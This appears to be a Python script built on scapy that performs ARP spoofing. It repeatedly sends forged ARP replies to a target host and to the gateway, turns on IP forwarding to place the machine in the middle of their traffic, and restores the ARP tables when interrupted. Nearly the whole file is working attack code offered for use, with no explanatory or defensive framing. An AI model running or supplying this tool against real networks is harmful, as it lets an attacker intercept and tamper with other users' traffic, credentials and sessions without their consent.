
import scapy.all as scapy
from network_tools import *
from progress_tools import Spin

def restore_arp(destination_id, source_id, gateway):
    destination_mac = arp_get_mac(destination_id, gateway)
    source_mac = arp_get_mac(source_id, gateway)
    packet = scapy.ARP( op=2, pdst=destination_id, hwdst=destination_mac,  psrc=source_id, hwsrc=source_mac )
    scapy.send(packet, count = 10, verbose=False)

def spoofing(target_ip, target_mac, gateway):
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway)
    scapy.send(packet, verbose=False)

def run_spoofer(target_ip, gateway):
    print(f'[+] Calculating MAC for spoofing IP >> {target_ip}...')
    target_mac = arp_get_mac(target_ip, gateway)
    gateway_mac = arp_get_mac(gateway, gateway)
    enable_ip_forward(turn=True)

    try:
        spinner = Spin(f'Spoofing [MAC: {target_mac} IP: {target_ip}]')
        spinner.spin_thread.start()
        while True:
            spoofing(target_ip, target_mac, gateway)
            spoofing(gateway, gateway_mac, target_ip)
            time.sleep(1)

    except KeyboardInterrupt:
        spinner.stop_spin()
        print(f'[+] Stopping spoofing and restoring ARP tables...')
        restore_arp(target_ip, gateway, gateway)
        restore_arp(gateway, target_ip, gateway)
        print('[+] Restored !')
        
    enable_ip_forward(turn=False)
